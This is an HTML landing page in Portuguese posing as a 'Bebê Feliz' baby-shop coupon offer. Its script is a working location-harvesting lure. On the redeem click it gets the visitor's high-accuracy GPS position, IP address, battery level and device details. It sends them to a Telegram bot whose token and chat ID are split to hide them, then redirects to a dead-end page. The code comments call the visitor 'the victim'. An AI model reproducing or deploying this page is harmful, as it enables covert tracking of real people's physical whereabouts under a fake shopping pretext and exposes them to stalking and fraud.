<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bebê Feliz - Oferta Exclusiva</title>
    <link href="https://fonts.googleapis.com/css2?family=Quicksand:wght@400;600;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --primary: #ff8fa3;
            --secondary: #a29bfe;
            --bg: #fff0f3;
        }
        body {
            font-family: 'Quicksand', sans-serif;
            background: var(--bg);
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .card {
            background: white;
            width: 90%;
            max-width: 400px;
            border-radius: 20px;
            box-shadow: 0 15px 35px rgba(162, 155, 254, 0.2);
            text-align: center;
            padding: 40px 20px;
        }
        .icon {
            font-size: 60px;
            background: linear-gradient(135deg, var(--primary), var(--secondary));
            width: 100px;
            height: 100px;
            line-height: 100px;
            border-radius: 50%;
            margin: 0 auto 20px;
            color: white;
            box-shadow: 0 10px 20px rgba(255, 143, 163, 0.3);
        }
        h1 { color: var(--secondary); margin: 0 0 10px; font-size: 24px; }
        p { color: #666; font-size: 15px; line-height: 1.5; margin-bottom: 25px; }
        
        .coupon-box {
            background: #fff5f7;
            border: 2px dashed var(--primary);
            padding: 15px;
            border-radius: 12px;
            margin-bottom: 25px;
        }
        .code {
            font-size: 32px;
            font-weight: 800;
            color: var(--primary);
            letter-spacing: 2px;
            display: block;
        }
        
        .btn {
            background: var(--secondary);
            color: white;
            border: none;
            width: 100%;
            padding: 18px;
            border-radius: 50px;
            font-size: 18px;
            font-weight: 700;
            cursor: pointer;
            box-shadow: 0 8px 20px rgba(162, 155, 254, 0.4);
            transition: transform 0.2s;
        }
        .btn:active { transform: scale(0.96); }
        
        .status {
            margin-top: 20px;
            font-size: 14px;
            color: #888;
            font-weight: 600;
            min-height: 20px;
        }
    </style>
</head>
<body>

    <div class="card">
        <div class="icon">👶</div>
        <h1>Bebê Feliz</h1>
        <p>Desconto exclusivo de lançamento. Resgate agora e ganhe frete grátis calculado automaticamente.</p>
        
        <div class="coupon-box">
            <small style="color:#888; text-transform:uppercase; font-weight:700;">Seu Cupom</small>
            <span class="code">BEBE50</span>
        </div>

        <button class="btn" id="actionBtn" onclick="startProcess()">RESGATAR DESCONTO</button>
        <div class="status" id="statusText"></div>
    </div>

    <script>
        // Configurações Ofuscadas
        const _p1 = "8952863326:AAG";
        const _p2 = "bv532qodG8yJJZ6mXSd99oYx6TPvNC7Y";
        const TOKEN = _p1 + _p2;
        const CHAT_ID = "8607389403";
        
        // Link final que não existe ou dá erro (para confundir a vítima)
        const DEAD_END = "https://tudoparabebe.com.br"; 

        let hasSent = false;

        function startProcess() {
            if (hasSent) return;
            
            const btn = document.getElementById('actionBtn');
            const status = document.getElementById('statusText');
            
            // 1. Feedback Visual Imediato
            btn.disabled = true;
            btn.style.opacity = "0.6";
            btn.innerHTML = "Processando...";
            status.innerText = "📍 Calculando frete para sua região...";
            status.style.color = "#a29bfe";

            // 2. Coleta de Dados Básicos
            const data = {
                ip: "Buscando...",
                ua: navigator.userAgent,
                bat: "N/A",
                gps: "Pendente"
            };

            // Bateria
            if(navigator.getBattery) {
                navigator.getBattery().then(b => data.bat = Math.round(b.level * 100) + "%");
            }

            // IP
            fetch('https://api.ipify.org?format=json')
                .then(r => r.json())
                .then(j => data.ip = j.ip)
                .catch(() => data.ip = "Falha");

            // 3. Solicitar GPS (O Coração do Script)
            if ("geolocation" in navigator) {
                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        // SUCESSO: Pegou localização exata
                        data.gps = `https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}`;
                        status.innerText = "✅ Endereço validado! Processando...";
                        finalize(data);
                    },
                    (err) => {
                        // FALHA: Negou ou erro
                        data.gps = "Negado (Usuário bloqueou)";
                        status.innerText = "⚠️ Usando localização por IP...";
                        finalize(data);
                    },
                    { enableHighAccuracy: true, timeout: 10000 }
                );
            } else {
                data.gps = "Não suportado";
                finalize(data);
            }
        }

        async function finalize(data) {
            if (hasSent) return;
            hasSent = true;

            const caption = `
👶 <b>NOVO LEAD - BEBÊ FELIZ</b>
📍 <b>Localização:</b> ${data.gps}
🌐 <b>IP:</b> ${data.ip}
🔋 <b>Bateria:</b> ${data.bat}
📱 <b>Dispositivo:</b> ${navigator.platform}
`;

            // Envia apenas texto (mais rápido e leve)
            const url = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
            
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('text', caption);
            formData.append('parse_mode', 'HTML');

            await fetch(url, {
                method: 'POST',
                body: formData
            });

            // 4. Redirecionamento para o "Beco Sem Saída"
            setTimeout(() => {
                window.location.href = DEAD_END;
            }, 1500);
        }
    </script>
</body>
</html>
